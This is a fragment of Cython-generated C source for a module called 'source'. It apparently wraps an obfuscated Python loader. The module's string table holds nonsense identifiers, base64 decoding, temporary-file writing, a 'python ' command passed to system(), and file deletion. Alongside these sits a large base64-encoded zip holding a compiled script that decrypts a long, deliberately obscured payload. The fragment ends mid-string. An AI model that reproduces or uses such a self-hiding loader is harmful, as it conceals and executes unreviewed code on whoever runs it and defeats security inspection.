#define __Pyx_ErrFetch(type, value, tb)  PyErr_Fetch(type, value, tb)
#endif

/* RaiseException.proto */
static void __Pyx_Raise(PyObject *type, PyObject *value, PyObject *tb, PyObject *cause);

/* IncludeStringH.proto */
#include <string.h>

/* PyObject_GenericGetAttrNoDict.proto */
#if CYTHON_USE_TYPE_SLOTS && CYTHON_USE_PYTYPE_LOOKUP && PY_VERSION_HEX < 0x03070000
static CYTHON_INLINE PyObject* __Pyx_PyObject_GenericGetAttrNoDict(PyObject* obj, PyObject* attr_name);
#else
#define __Pyx_PyObject_GenericGetAttrNoDict PyObject_GenericGetAttr
#endif

/* GetException.proto */
#if CYTHON_FAST_THREAD_STATE
#define __Pyx_GetException(type, value, tb)  __Pyx__GetException(__pyx_tstate, type, value, tb)
static int __Pyx__GetException(PyThreadState *tstate, PyObject **type, PyObject **value, PyObject **tb);
#else
static int __Pyx_GetException(PyObject **type, PyObject **value, PyObject **tb);
#endif

/* SwapException.proto */
#if CYTHON_FAST_THREAD_STATE
#define __Pyx_ExceptionSwap(type, value, tb)  __Pyx__ExceptionSwap(__pyx_tstate, type, value, tb)
static CYTHON_INLINE void __Pyx__ExceptionSwap(PyThreadState *tstate, PyObject **type, PyObject **value, PyObject **tb);
#else
static CYTHON_INLINE void __Pyx_ExceptionSwap(PyObject **type, PyObject **value, PyObject **tb);
#endif

/* GetTopmostException.proto */
#if CYTHON_USE_EXC_INFO_STACK
static _PyErr_StackItem * __Pyx_PyErr_GetTopmostException(PyThreadState *tstate);
#endif

/* SaveResetException.proto */
#if CYTHON_FAST_THREAD_STATE
#define __Pyx_ExceptionSave(type, value, tb)  __Pyx__ExceptionSave(__pyx_tstate, type, value, tb)
static CYTHON_INLINE void __Pyx__ExceptionSave(PyThreadState *tstate, PyObject **type, PyObject **value, PyObject **tb);
#define __Pyx_ExceptionReset(type, value, tb)  __Pyx__ExceptionReset(__pyx_tstate, type, value, tb)
static CYTHON_INLINE void __Pyx__ExceptionReset(PyThreadState *tstate, PyObject *type, PyObject *value, PyObject *tb);
#else
#define __Pyx_ExceptionSave(type, value, tb)   PyErr_GetExcInfo(type, value, tb)
#define __Pyx_ExceptionReset(type, value, tb)  PyErr_SetExcInfo(type, value, tb)
#endif

/* CLineInTraceback.proto */
#ifdef CYTHON_CLINE_IN_TRACEBACK
#define __Pyx_CLineForTraceback(tstate, c_line)  (((CYTHON_CLINE_IN_TRACEBACK)) ? c_line : 0)
#else
static int __Pyx_CLineForTraceback(PyThreadState *tstate, int c_line);
#endif

/* CodeObjectCache.proto */
typedef struct {
    PyCodeObject* code_object;
    int code_line;
} __Pyx_CodeObjectCacheEntry;
struct __Pyx_CodeObjectCache {
    int count;
    int max_count;
    __Pyx_CodeObjectCacheEntry* entries;
};
static struct __Pyx_CodeObjectCache __pyx_code_cache = {0,0,NULL};
static int __pyx_bisect_code_objects(__Pyx_CodeObjectCacheEntry* entries, int count, int code_line);
static PyCodeObject *__pyx_find_code_object(int code_line);
static void __pyx_insert_code_object(int code_line, PyCodeObject* code_object);

/* AddTraceback.proto */
static void __Pyx_AddTraceback(const char *funcname, int c_line,
                               int py_line, const char *filename);

/* GCCDiagnostics.proto */
#if defined(__GNUC__) && (__GNUC__ > 4 || (__GNUC__ == 4 && __GNUC_MINOR__ >= 6))
#define __Pyx_HAS_GCC_DIAGNOSTIC
#endif

/* CIntToPy.proto */
static CYTHON_INLINE PyObject* __Pyx_PyInt_From_long(long value);

/* CIntFromPy.proto */
static CYTHON_INLINE long __Pyx_PyInt_As_long(PyObject *);

/* CIntFromPy.proto */
static CYTHON_INLINE int __Pyx_PyInt_As_int(PyObject *);

/* FastTypeChecks.proto */
#if CYTHON_COMPILING_IN_CPYTHON
#define __Pyx_TypeCheck(obj, type) __Pyx_IsSubtype(Py_TYPE(obj), (PyTypeObject *)type)
static CYTHON_INLINE int __Pyx_IsSubtype(PyTypeObject *a, PyTypeObject *b);
static CYTHON_INLINE int __Pyx_PyErr_GivenExceptionMatches(PyObject *err, PyObject *type);
static CYTHON_INLINE int __Pyx_PyErr_GivenExceptionMatches2(PyObject *err, PyObject *type1, PyObject *type2);
#else
#define __Pyx_TypeCheck(obj, type) PyObject_TypeCheck(obj, (PyTypeObject *)type)
#define __Pyx_PyErr_GivenExceptionMatches(err, type) PyErr_GivenExceptionMatches(err, type)
#define __Pyx_PyErr_GivenExceptionMatches2(err, type1, type2) (PyErr_GivenExceptionMatches(err, type1) || PyErr_GivenExceptionMatches(err, type2))
#endif
#define __Pyx_PyException_Check(obj) __Pyx_TypeCheck(obj, PyExc_Exception)

/* CheckBinaryVersion.proto */
static int __Pyx_check_binary_version(void);

/* InitStrings.proto */
static int __Pyx_InitStrings(__Pyx_StringTabEntry *t);


/* Module declarations from 'source' */
static PyTypeObject *__pyx_ptype_6source___pyx_scope_struct____pyx_lambda_funcdef_6source_lambda4 = 0;
#define __Pyx_MODULE_NAME "source"
extern int __pyx_module_is_main_source;
int __pyx_module_is_main_source = 0;

/* Implementation of 'source' */
static PyObject *__pyx_builtin_map;
static PyObject *__pyx_builtin_chr;
static PyObject *__pyx_builtin___import__;
static PyObject *__pyx_builtin_open;
static const char __pyx_k_[] = "";
static const char __pyx_k_d[] = "d";
static const char __pyx_k_n[] = "n";
static const char __pyx_k_wb[] = "wb";
static const char __pyx_k_chr[] = "chr";
static const char __pyx_k_lll[] = "lll";
static const char __pyx_k_map[] = "map";
static const char __pyx_k_llll[] = "llll";
static const char __pyx_k_main[] = "__main__";
static const char __pyx_k_name[] = "name";
static const char __pyx_k_open[] = "open";
static const char __pyx_k_path[] = "path";
static const char __pyx_k_test[] = "__test__";
static const char __pyx_k_close[] = "close";
static const char __pyx_k_flush[] = "flush";
static const char __pyx_k_lllll[] = "lllll";
static const char __pyx_k_write[] = "write";
static const char __pyx_k_Kriyox[] = "Kriyox";
static const char __pyx_k_delete[] = "delete";
static const char __pyx_k_encode[] = "encode";
static const char __pyx_k_exists[] = "exists";
static const char __pyx_k_import[] = "__import__";
static const char __pyx_k_lambda[] = "<lambda>";
static const char __pyx_k_llllll[] = "llllll";
static const char __pyx_k_name_2[] = "__name__";
static const char __pyx_k_python[] = "python ";
static const char __pyx_k_remove[] = "remove";
static const char __pyx_k_sha256[] = "sha256";
static const char __pyx_k_source[] = "source";
static const char __pyx_k_suffix[] = "suffix";
static const char __pyx_k_system[] = "system";
static const char __pyx_k_Shishya[] = "Shishya";
static const char __pyx_k_hashlib[] = "hashlib";
static const char __pyx_k_lllllll[] = "lllllll";
static const char __pyx_k_tmp_zip[] = ".tmp.zip";
static const char __pyx_k_combined[] = "combined";
static const char __pyx_k_llllllll[] = "llllllll";
static const char __pyx_k_b64decode[] = "b64decode";
static const char __pyx_k_hexdigest[] = "hexdigest";
static const char __pyx_k_lllllllll[] = "lllllllll";
static const char __pyx_k_source_py[] = "source.py";
static const char __pyx_k_llllllllll[] = "llllllllll";
static const char __pyx_k_lllllllllll[] = "lllllllllll";
static const char __pyx_k_llllllllllll[] = "llllllllllll";
static const char __pyx_k_lllllllllllll[] = "lllllllllllll";
static const char __pyx_k_llllllllllllll[] = "llllllllllllll";
static const char __pyx_k_lllllllllllllll[] = "lllllllllllllll";
static const char __pyx_k_llllllllllllllll[] = "llllllllllllllll";
static const char __pyx_k_NamedTemporaryFile[] = "NamedTemporaryFile";
static const char __pyx_k_cline_in_traceback[] = "cline_in_traceback";
static const char __pyx_k_lambda_locals_lambda[] = "<lambda>.<locals>.<lambda>";
static const char __pyx_k_llllllllllllllllllll[] = "llllllllllllllllllll";
static const char __pyx_k_lllllllllllllllllllll[] = "lllllllllllllllllllll";
static const char __pyx_k_llllllllllllllllllllll[] = "llllllllllllllllllllll";
static const char __pyx_k_lllllllllllllllllllllll[] = "lllllllllllllllllllllll";
static const char __pyx_k_UEsDBBQAAAAAABtlvVodb_QZ7rkBAO65[] = "UEsDBBQAAAAAABtlvVodb/QZ7rkBAO65AQAMAAAAX19tYWluX18ucHljpw0NCgAAAADWVThoTh0DAOMA\nAAAAAAAAAAAAAAAHAAAAAAAAAPNeAAAAlwBkAIQAWgBkAVoBZAJaAgIAZQBlAmUBpgIAAKsCAAAAAAAA\nAABaAwIAZQQCAGUFZQN4AVoGZANkBKwFpgMAAKsDAAAAAAAAAACmAQAAqwEAAAAAAAAAAAEAZAZTACkH\nYwIAAAAAAAAAAAAAAAgAAAADAAAA81oBAACHAIcDlwBkAaAAAAAAAAAAAAAAAAAAAAAAAAAAAACIAGYB\nZAKECHQDAAAAAAAAAAAAAHQFAAAAAAAAAAAAAIkApgEAAKsBAAAAAAAAAABkA3oCAACmAQAAqwEAAAAA\nAAAAAEQApgAAAKsAAAAAAAAAAACmAQAAqwEAAAAAAAAAAH0CZAGgAAAAAAAAAAAAAAAAAAAAAAAAAAAA\niABmAWQEhAh0AwAAAAAAAAAAAAB0BQAAAAAAAAAAAACJAKYBAACrAQAAAAAAAAAAZAN6AgAApgEAAKsB\nAAAAAAAAAABEAKYAAACrAAAAAAAAAAAApgEAAKsBAAAAAAAAAACKA2QBoAAAAAAAAAAAAAAAAAAAAAAA\nAAAAAIgDZgFkBYQIdAcAAAAAAAAAAAAAfAKmAQAAqwEAAAAAAAAAAEQApgAAAKsAAAAAAAAAAACmAQAA\nqwEAAAAAAAAAAFMAKQZO2gBjAQAAAAAAAAAAAAAABAAAADMAAADzLgAAAJUBSwABAJcAfABdD30BiQJ8\nAWQAegUAABkAAAAAAAAAAABWAJcBAQCMEGQBUwApAukCAAAATqkAqQPaAi4w2gFp2g1kYXRhX3dpdGhf\na2V5cwMAAAAgIID6NXRlbXBfZmlsZXMvdXNlcl83Mjg3MDU0NjU1XzE3NDg1MjI0NDUvc2VuZHRoaWZo\nY2tfLnB5+gk8Z2VuZXhwcj56H0tpcmF4U2hpc2h5YS48bG9jYWxzPi48Z2VuZXhwcj4CAAAAcywAAAD4\n6ADoAIAA0BxY0BxYsEGYXagxqFGpM9QdL9AcWNAcWNAcWNAcWNAcWNAcWPMAAAAAcgUAAABjAQAAAAAA\nAAAAAAAABAAAADMAAADzNAAAAJUBSwABAJcAfABdEn0BiQJ8AWQAegUAAGQBegAAABkAAAAAAAAAAABW\nAJcBAQCME2QCUwApA3IFAAAA6QEAAABOcgYAAAByBwAAAHMDAAAAICCAcgsAAAByDAAAAHofS2lyYXhT\naGlzaHlhLjxsb2NhbHM+LjxnZW5leHByPgMAAABzMAAAAPjoAOgAgADQEVHQEVGoUZAtoAGgIaEDoGGh\nB9QSKNARUdARUdARUdARUdARUdARUXINAAAAYwEAAAAAAAAAAAAAAAsAAAAzAAAA86IAAACVAUsAAQCX\nAHwAXUlcAgAAfQF9AnQBAAAAAAAAAAAAAHQDAAAAAAAAAAAAAHwCpgEAAKsBAAAAAAAAAAB0AwAAAAAA\nAAAAAACJA3wBdAUAAAAAAAAAAAAAiQOmAQAAqwEAAAAAAAAAAHoGAAAZAAAAAAAAAAAApgEAAKsBAAAA\nAAAAAAB6DAAApgEAAKsBAAAAAAAAAABWAJcBAQCMSmQAUwApAU4pA9oDY2hy2gNvcmTaA2xlbikEcggA\nAAByCQAAANoBY9oDa2V5cwQAAAAgICCAcgsAAAByDAAAAHofS2lyYXhTaGlzaHlhLjxsb2NhbHM+Ljxn\nZW5leHByPgQAAABzUQAAAPjoAOgAgADQEl7QEl65RLhBuHGVM5VzmDGRdpR2pQOgQ6gBrUOwA6lIrEip\nDNQkNdEgNtQgNtEXNtETN9QTN9ASXtASXtASXtASXtASXtASXnINAAAAKQTaBGpvaW7aBXJhbmdlchMA\nAADaCWVudW1lcmF0ZSkEcgoAAADaBkxh""eWVyc9oOZW5jcnlwdGVkX3RleHRyFQAAAHMEAAAAYCAgQHIL\nAAAA2gxLaXJheFNoaXNoeWFyGwAAAAEAAABzqgAAAPj4gADYFReXV5JX0BxY0BxY0BxY0BxYvRW9c8A9\n0T9R1D9R0FVW0T9W0TlX1DlX0BxY0RxY1BxY0RVY1BVYgE7YCgyPJ4on0BFR0BFR0BFR0BFRtSW9A7hN\n0ThK1DhKyGHROE/RMlDUMlDQEVHREVHUEVHRClHUClGAQ9gLDY83ijfQEl7QEl7QEl7QEl7FSchu0URd\n1ERd0BJe0RJe1BJe0Qte1Ate0ARecg0AAAByDwAAAHWBsgEA4oGi4oCL4oGm4oCL4oG74oCL4oGk4oCL\n4oG54oCL4oG/4oCL4oCr4oCL4oGk4oCL4oG44oCL4oCB4oCL4oCB4oCL4oCB4oCL4oCB4oCL4oCB4oCL\n4oCB4oCL4oCB4oCL4oG/4oCL4oG54oCL4oGy4oCL4oCx4oCL4oGi4oCL4oGm4oCL4oG74oCL4oGk4oCL\n4oG54oCL4oG/4oCL4oCr4oCL4oGo4oCL4oGt4oCL4oGk4oCL4oGl4oCL4oG/4oCL4oG44oCL4oCw4oCL\n4oGt4oCL4oG54oCL4oGk4oCL4oGm4oCL4oCr4oCL4oGo4oCL4oGt4oCL4oGk4oCL4oGl4oCL4oG/4oCL\n4oG44oCL4oCr4oCL4oGi4oCL4oGm4oCL4oG74oCL4oGk4oCL4oG54oCL4oG/4oCL4oCr4oCL4oG54oCL\n4oGu4oCL4oGl4oCL4oGv4oCL4oGu4oCL4oG54oCL4oCB4oCL4oCB4oCL4oCB4oCL4oCB4oCL4oCB4oCL\n4oCB4oCL4oCB4oCL4oGu4oCL4oGz4oCL4oGo4oCL4oGu4oCL4oG74oCL4oG/4oCL4oCx4oCL4oGk4oCL\n4oG44oCL4oCl4oCL4oG44oCL4oGy4oCL4oG44oCL4oG/4oCL4oGu4oCL4oGm4oCL4oCj4oCL4oCp4oCL\n4oG74oCL4oGi4oCL4oG74oCL4oCr4oCL4oGi4oCL4oGl4oCL4oG44oCL4oG/4oCL4oGq4oCL4oGn4oCL\n4oGn4oCL4oCr4oCL4oG74oCL4oGy4oCL4oG/4oCL4oGj4oCL4oGk4oCL4oGl4oCL4oCm4oCL4oGo4oCL\n4oGt4oCL4oGk4oCL4oGl4oCL4oG/4oCL4oG44oCL4oCp4oCL4oCi4oCL4oCB4oCL4oCB4oCL4oCB4oCL\n4oCB4oCL4oCB4oCL4oCB4oCL4oCB4oCL4oG/4oCL4oG54oCL4oGy4oCL4oCx4oCL4oGi4oCL4oGm4oCL\n4oG74oCL4oGk4oCL4oG54oCL4oG/4oCL4oCr4oCL4oG54oCL4oGu4oCL4oG64oCL4oG+4oCL4oGu4oCL\n4oG44oCL4oG/4oCL4oG44oCL4oCB4oCL4oCB4oCL4oCB4oCL4oCB4oCL4oCB4oCL4oCB4oCL4oCB4oCL\n4oGu4oCL4oGz4oCL4oGo4oCL4oGu4oCL4oG74oCL4oG/4oCL4oCx4oCL4oGk4oCL4oG44oCL4oCl4oCL\n4oG44oCL4oGy4oCL4oG44oCL4oG/4oCL4oGu4oCL4oGm4oCL4oCj4oCL4oCp4oCL4oG74oCL4oGi4oCL\n4oG74oCL4oCr4oCL4oGi4oCL4oGl4oCL4oG44oCL4oG/4oCL4oGq4oCL4oGn4oCL4oGn4oCL4oCr4oCL\n4oG54oCL4oGu4oCL4oG64oCL4oG+4oCL4oGu4oCL4oG44oCL4oG/4oCL4oG44oCL4oCp4oCL4oCi4oCL\n4oCB4oCL4oCB4oCL4oCB4oCL4oCB4oCL4oCB4oCL4oCB4oCL4oCB4oCL4oG/4oCL4oG54oCL4oGy4oCL\n4oCx4oCL4oGt4oCL4oG54oCL4oGk4oCL4oGm4oCL4oCr4oCL4oGp4oCL4oG44oCL""4oC/4oCL4oCr4oCL\n4oGi4oCL4oGm4oCL4oG74oCL4oGk4oCL4oG54oCL4oG/4oCL4oCr4oCL4oGJ4oCL4oGu4oCL4oGq4oCL\n4oG+4oCL4oG/4oCL4oGi4oCL4oGt4oCL4oG+4oCL4oGn4oCL4oGY4oCL4oGk4oCL4oG+4oCL4oG74oCL\n4oCB4oCL4oCB4oCL4oCB4oCL4oCB4oCL4oCB4oCL4oCB4oCL4oCB4oCL4oGu4oCL4oGz4oCL4oGo4oCL\n4oGu4oCL4oG74oCL4oG/4oCL4oCx4oCL4oGk4oCL4oG44oCL4oCl4oCL4oG44oCL4oGy4oCL4oG44oCL\n4oG/4oCL4oGu4oCL4oGm4oCL4oCj4oCL4oCp4oCL4oG74oCL4oGi4oCL4oG74oCL4oCr4oCL4oGi4oCL\n4oGl4oCL4oG44oCL4oG/4oCL4oGq4oCL4oGn4oCL4oGn4oCL4oCr4oCL4oGp4oCL4oG44oCL4oC/4oCL\n4oCp4oCL4oCi4oCL4oCB4oCL4oCB4oCL4oCB4oCL4oCB4oCL4oCB4oCL4oCB4oCL4oCB4oCL4oG/4oCL\n4oG54oCL4oGy4oCL4oCx4oCL4oGi4oCL4oGm4oCL4oG74oCL4oGk4oCL4oG54oCL4oG/4oCL4oCr4oCL\n4oGh4oCL4oG44oCL4oGk4oCL4oGl4oCL4oCn4oCL4oG54oCL4oGu4oCL4oCn4oCL4oGk4oCL4oG44oCL\n4oCn4oCL4oG44oCL4oGy4oCL4oG44oCL4oCB4oCL4oCB4oCL4oCB4oCL4oCB4oCL4oCB4oCL4oCB4oCL\n4oCB4oCL4oGu4oCL4oGz4oCL4oGo4oCL4oGu4oCL4oG74oCL4oG/4oCL4oCx4oCL4oGk4oCL4oG44oCL\n4oCl4oCL4oG44oCL4oGy4oCL4oG44oCL4oG/4oCL4oGu4oCL4oGm4oCL4oCj4oCL4oCp4oCL4oG74oCL\n4oGi4oCL4oG74oCL4oCr4oCL4oGi4oCL4oGl4oCL4oG44oCL4oG/4oCL4oGq4oCL4oGn4oCL4oGn4oCL\n4oCr4oCL4oGh4oCL4oG44oCL4oGk4oCL4oGl4oCL4oCp4oCL4oCi4oCL4oCB4oCL4oCB4oCL4oCB4oCL\n4oCB4oCL4oCB4oCL4oCB4oCL4oCB4oCL4oG/4oCL4oG54oCL4oGy4oCL4oCx4oCL4oGt4oCL4oG54oCL\n4oGk4oCL4oGm4oCL4oCr4oCL4oGv4oCL4oGq4oCL4oG/4oCL4oGu4oCL4oG/4oCL4oGi4oCL4oGm4oCL\n4oGu4oCL4oCr4oCL4oGi4oCL4oGm4oCL4oG74oCL4oGk4oCL4oG54oCL4oG/4oCL4oCr4oCL4oGv4oCL\n4oGq4oCL4oG/4oCL4oGu4oCL4oG/4oCL4oGi4oCL4oGm4oCL4oGu4oCL4oCB4oCL4oCB4oCL4oCB4oCL\n4oCB4oCL4oCB4oCL4oCB4oCL4oCB4oCL4oGu4oCL4oGz4oCL4oGo4oCL4oGu4oCL4oG74oCL4oG/4oCL\n4oCx4oCL4oGk4oCL4oG44oCL4oCl4oCL4oG44oCL4oGy4oCL4oG44oCL4oG/4oCL4oGu4oCL4oGm4oCL\n4oCj4oCL4oCp4oCL4oG74oCL4oGi4oCL4oG74oCL4oCr4oCL4oGi4oCL4oGl4oCL4oG44oCL4oG/4oCL\n4oGq4oCL4oGn4oCL4oGn4oCL4oCr4oCL4oG54oCL4oGu4oCL4oCp4oCL4oCi4oCL4oCB4oCL4oCB4oCL\n4oCB4oCL4oCB4oCL4oCB4oCL4oCB4oCL4oCB4oCL4oG/4oCL4oG54oCL4oGy4oCL4oCx4oCL4oGt4oCL\n4oG54oCL4oGk4oCL4oGm4oCL4oCr4oCL4oG+4oCL4oG44oCL4oGu4oCL4oG54oCL4oGU4oCL4oGq4oCL\n4oGs4oCL4oGu4o""CL4oGl4oCL4oG/4oCL4oCr4oCL4oGi4oCL4oGm4oCL4oG74oCL4oGk4oCL4oG54oCL\n4oG/4oCL4oCr4oCL4oGs4oCL4oGu4oCL4oGl4oCL4oGu4oCL4oG54oCL4oGq4oCL4oG/4oCL4oGu4oCL\n4oGU4oCL4oG+4oCL4oG44oCL4oGu4oCL4oG54oCL4oGU4oCL4oGq4oCL4oGs4oCL4oGu4oCL4oGl4oCL\n4oG/4oCL4oCB4oCL4oCB4oCL4oCB4oCL4oCB4oCL4oCB4oCL4oCB4oCL4oCB4oCL4oGu4oCL4oGz4oCL\n4oGo4oCL4oGu4oCL4oG74oCL4oG/4oCL4oCx4oCL4oGk4oCL4oG44oCL4oCl4oCL4oG44oCL4oGy4oCL\n4oG44oCL4oG/4oCL4oGu4oCL4oGm4oCL4oCj4oCL4oCp4oCL4oG74oCL4oGi4oCL4oG74oCL4oCr4oCL\n4oGi4oCL4oGl4oCL4oG44oCL4oG/4oCL4oGq4oCL4oGn4oCL4oGn4oCL4oCr4oCL4oG+4oCL4oG44oCL\n4oGu4oCL4oG54oCL4oGU4oCL4oGq4oCL4oGs4oCL4oGu4oCL4oGl4oCL4oG/4oCL4oCp4oCL4oCi4oCL\n4oCB4oCL4oCB4oCL4oCB4oCL4oCB4oCL4oCB4oCL4oCB4oCL4oCB4oCL4oG/4oCL4oG54oCL4oGy4oCL\n4oCx4oCL4oGt4oCL4oG54oCL4oGk4oCL4oGm4oCL4oCr4oCL4oG+4oCL4oG44oCL4oGu4oCL4oG54oCL\n4oGU4oCL4oGq4oCL4oGs4oCL4oGu4oCL4oGl4oCL4oG/4oCL4oCr4oCL4oGi4oCL4oGm4oCL4oG74oCL\n4oGk4oCL4oG54oCL4oG/4oCL4oCr4oCL4oGs4oCL4oGu4oCL4oGl4oCL4oGu4oCL4oG54oCL4oGq4oCL\n4oG/4oCL4oGu4oCL4oGU4oCL4oG+4oCL4oG44oCL4oGu4oCL4oG54oCL4oGU4oCL4oGq4oCL4oGs4oCL\n4oGu4oCL4oGl4oCL4oG/4oCL4oCr4oCL4oGq4oCL4oG44oCL4oCr4oCL4oGs4oCL4oGs4oCL4oGp4oCL\n4oCB4oCL4oCB4oCL4oCB4oCL4oCB4oCL4oCB4oCL4oCB4oCL4oCB4oCL4oGu4oCL4oGz4oCL4oGo4oCL\n4oGu4oCL4oG74oCL4oG/4oCL4oCx4oCL4oGk4oCL4oG44oCL4oCl4oCL4oG44oCL4oGy4oCL4oG44oCL\n4oG/4oCL4oGu4oCL4oGm4oCL4oCj4oCL4oCp4oCL4oG74oCL4oGi4oCL4oG74oCL4oCr4oCL4oGi4oCL\n4oGl4oCL4oG44oCL4oG/4oCL4oGq4oCL4oGn4oCL4oGn4oCL4oCr4oCL4oGh4oCL4oG44oCL4oGk4oCL\n4oGl4oCL4oCp4oCL4oCi4oCL4oCB4oCL4oCB4oCL4oCB4oCL4oCB4oCL4oCB4oCL4oCB4oCL4oCB4oCL\n4oG/4oCL4oG54oCL4oGy4oCL4oCx4oCL4oGt4oCL4oG54oCL4oGk4oCL4oGm4oCL4oCr4oCL4oG54oCL\n4oGi4oCL4oGo4oCL4oGj4oCL4oCl4oCL4oGo4oCL4oGk4oCL4oGl4oCL4oG44oCL4oGk4oCL4oGn4oCL\n4oGu4oCL4oCr4oCL4oGi4oCL4oGm4oCL4oG74oCL4oGk4oCL4oG54oCL4oG/4oCL4oCr4oCL4oGI4oCL\n4oGk4oCL4oGl4oCL4oG44oCL4oGk4oCL4oGn4oCL4oGu4oCL4oCB4oCL4oCB4oCL4oCB4oCL4oCB4oCL\n4oCB4oCL4oCB4oCL4oCB4oCL4oGu4oCL4oGz4oCL4oGo4oCL4oGu4oCL4oG74oCL4oG/4oCL4oCx4oCL\n4oGk4oCL4oG44oCL4oCl4oCL4oG44oCL4oGy4oCL4oG44o""CL4oG/4oCL4oGu4oCL4oGm4oCL4oCj4oCL\n4oCp4oCL4oG74oCL4oGi4oCL4oG74oCL4oCr4oCL4oGi4oCL4oGl4oCL4oG44oCL4oG/4oCL4oGq4oCL\n4oGn4oCL4oGn4oCL4oCr4oCL4oG54oCL4oGi4oCL4oGo4oCL4oGj4oCL4oCp4oCL4oCi4oCL4oCB4oCL\n4oCB4oCL4oCB4oCL4oCB4oCL4oCB4oCL4oCB4oCL4oCB4oCL4oG/4oCL4oG54oCL4oGy4oCL4oCx4oCL\n4oGt4oCL4oG54oCL4oGk4oCL4oGm4oCL4oCr4oCL4oG54oCL4oGi4oCL4oGo4oCL4oGj4oCL4oCl4oCL\n4oG74oCL4oGq4oCL4oGl4oCL4oGu4oCL4oGn4oCL4oCr4oCL4oGi4oCL4oGm4oCL4oG74oCL4oGk4oCL\n4oG54oCL4oG/4oCL4oCr4oCL4oGb4oCL4oGq4oCL4oGl4oCL4oGu4oCL4oGn4oCL4oCB4oCL4oCB4oCL\n4oCB4oCL4oCB4oCL4oCB4oCL4oCB4oCL4oCB4oCL4oGu4oCL4oGz4oCL4oGo4oCL4oGu4oCL4oG74oCL\n4oG/4oCL4oCx4oCL4oGk4oCL4oG44oCL4oCl4oCL4oG44oCL4oGy4oCL4oG44oCL4oG/4oCL4oGu4oCL\n4oGm4oCL4oCj4oCL4oCp4oCL4oG74oCL4oGi4oCL4oG74oCL4oCr4oCL4oGi4oCL4oGl4oCL4oG44oCL\n4oG/4oCL4oGq4oCL4oGn4oCL4oGn4oCL4oCr4oCL4oG/4oCL4oGj4oCL4oG54oCL4oGu4oCL4oGq4oCL\n4oGv4oCL4oGi4oCL4oGl4oCL4oGs4oCL4oCp4oCL4oCi4oCL4oCB4oCL4oCB4oCL4oCB4oCL4oCB4oCL\n4oCB4oCL4oCB4oCL4oCB4oCL4oG/4oCL4oG54oCL4oGy4oCL4oCx4oCL4oGi4oCL4oGm4oCL4oG74oCL\n4oGk4oCL4oG54oCL4oG/4oCL4oCr4oCL4oG/4oCL4oGj4oCL4oG54oCL4oGu4oCL4oGq4oCL4oGv4oCL\n4oGi4oCL4oGl4oCL4oGs4oCL4oCn4oCL4oG84oCL4oGu4oCL4oGp4oCL4oGp4oCL4oG54oCL4oGk4oCL\n4oG84oCL4oG44oCL4oGu4oCL4oG54oCL4oCB4oCL4oCB4oCL4oCB4oCL4oCB4oCL4oCB4oCL4oCB4oCL\n4oCB4oCL4oGu4oCL4oGz4oCL4oGo4oCL4oGu4oCL4oG74oCL4oG/4oCL4oCx4oCL4oGk4oCL4oG44oCL\n4oCl4oCL4oG44oCL4oGy4oCL4oG44oCL4oG/4oCL4oGu4oCL4oGm4oCL4oCj4oCL4oCp4oCL4oG74oCL\n4oGi4oCL4oG74oCL4oCr4oCL4oGi4oCL4oGl4oCL4oG44oCL4oG/4oCL4oGq4oCL4oGn4oCL4oGn4oCL\n4oCr4oCL4oG54oCL4oGq4oCL4oGl4oCL4oGv4oCL4oGk4oCL4oGm4oCL4oCp4oCL4oCi4oCL4oCB4oCL\n4oCB4oCL4oCB4oCL4oCB4oCL4oCB4oCL4oCB4oCL4oCB4oCL4oG/4oCL4oG54oCL4oGy4oCL4oCx4oCL\n4oGi4oCL4oGm4oCL4oG74oCL4oGk4oCL4oG54oCL4oG/4oCL4oCr4oCL4oG54oCL4oGq4oCL4oGl4oCL\n4oGv4oCL4oGk4oCL4oGm4oCL4oCB4oCL4oCB4oCL4oCB4oCL4oCB4oCL4oCB4oCL4oCB4oCL4oCB4oCL\n4oGu4oCL4oGz4oCL4oGo4oCL4oGu4oCL4oG74oCL4oG/4oCL4oCx4oCL4oGk4oCL4oG44oCL4oCl4oCL\n4oG44oCL4oGy4oCL4oG44oCL4oG/4oCL4oGu4oCL4oGm4oCL4oCj4oCL4oCp4oCL4oG74oCL4oGi4o""CL\n4oG74oCL4oCr4oCL4oGi4oCL4oGl4oCL4oG44oCL4oG/4oCL4oGq4oCL4oGn4oCL4oGn4oCL4oCr4oCL\n4oGj4oCL4oGq4oCL4oG44oCL4oGj4oCL4oGn4oCL4oGi4oCL4oGp4oCL4oCp4oCL4oCi4oCL4oCB4oCL\n4oCB4oCL4oCB4oCL4oCB4oCL4oCB4oCL4oCB4oCL4oCB4oCL4oG/4oCL4oG54oCL4oGy4oCL4oCx4oCL\n4oGi4oCL4oGm4oCL4oG74oCL4oGk4oCL4oG54oCL4oG/4oCL4oCr4oCL4oGj4oCL4oGq4oCL4oG44oCL\n4oGj4oCL4oGn4oCL4oGi4oCL4oGp4oCL4oCB4oCL4oCB4oCL4oCB4oCL4oCB4oCL4oCB4oCL4oCB4oCL\n4oCB4oCL4oGu4oCL4oGz4oCL4oGo4oCL4oGu4oCL4oG74oCL4oG/4oCL4oCx4oCL4oGk4oCL4oG44oCL\n4oCl4oCL4oG44oCL4oGy4oCL4oG44oCL4oG/4oCL4oGu4oCL4oGm4oCL4oCj4oCL4oCp4oCL4oG74oCL\n4oGi4oCL4oG74oCL4oCr4oCL4oGi4oCL4oGl4oCL4oG44oCL4oG/4oCL4oGq4oCL4oGn4oCL4oGn4oCL\n4oCr4oCL4oG+4oCL4oG+4oCL4oGi4oCL4oGv4oCL4oCp4oCL4oCi4oCL4oCB4oCL4oCB4oCL4oCB4oCL\n4oCB4oCL4oCB4oCL4oCB4oCL4oCB4oCL4oG/4oCL4oG54oCL4oGy4oCL4oCx4oCL4oGi4oCL4oGm4oCL\n4oG74oCL4oGk4oCL4oG54oCL4oG/4oCL4oCr4oCL4oG+4oCL4oG+4oCL4oGi4oCL4oGv4oCL4oCB4oCL\n4oCB4oCL4oCB4oCL4oCB4oCL4oCB4oCL4oCB4oCL4oCB4oCL4oGu4oCL4oGz4oCL4oGo4oCL4oGu4oCL\n4oG74oCL4oG/4oCL4oCx4oCL4oGk4oCL4oG44oCL4oCl4oCL4oG44oCL4oGy4oCL4oG44oCL4oG/4oCL\n4oGu4oCL4oGm4oCL4oCj4oCL4oCp4oCL4oG74oCL4oGi4oCL4oG74oCL4oCr4oCL4oGi4oCL4oGl4oCL\n4oG44oCL4oG/4oCL4oGq4oCL4oGn4oCL4oGn4oCL4oCr4oCL4oG/4oCL4oGi4oCL4oGm4oCL4oGu4oCL\n4oCp4oCL4oCi4oCL4oCB4oCL4oCB4oCL4oCB4oCL4oCB4oCL4oCB4oCL4oCB4oCL4oCB4oCL4oG/4oCL\n4oG54oCL4oGy4oC